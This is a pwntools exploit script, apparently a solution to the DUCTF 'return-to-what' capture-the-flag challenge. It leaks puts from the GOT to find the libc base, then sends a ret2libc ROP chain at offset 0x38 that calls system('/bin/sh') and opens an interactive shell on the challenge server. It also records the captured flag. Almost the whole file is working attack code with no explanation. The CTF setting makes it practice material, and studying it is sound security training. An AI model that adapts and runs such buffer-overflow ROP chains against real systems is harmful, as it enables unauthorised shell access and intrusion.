"""
Leak libc from GOT, ROP to to system("/bin/sh")
"""

from pwn import *

binary_path = "./return-to-what"
#lib_path = "/lib/x86_64-linux-gnu/"
lib_path = "./lib/"

POP_RDI_RET = 0x000000000040122b
RET = 0x0000000000401016

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break main

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.duc.tf 30003
        return remote("chal.duc.tf", 30003)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})

io = start()

rop = ROP(elf)
rop.puts(elf.got.puts)
rop.vuln()

io.recvline()
io.clean()
io.sendline(flat({
    0x38: rop.chain()
}))

puts_addr = u64(io.recvline().strip().ljust(8, b"\0"))
libc.address = puts_addr - libc.sym.puts
print(f"LIBC: {hex(libc.address)}")

binsh_addr = next(libc.search(b"/bin/sh\0"))

rop = ROP(libc)
rop.raw(POP_RDI_RET)
rop.raw(binsh_addr)
rop.raw(RET)
rop.raw(libc.sym.system)
rop.raw(libc.sym.exit)

io.sendline(flat({
    0x38: rop.chain()
}))

io.interactive()

# DUCTF{ret_pUts_ret_main_ret_where???}
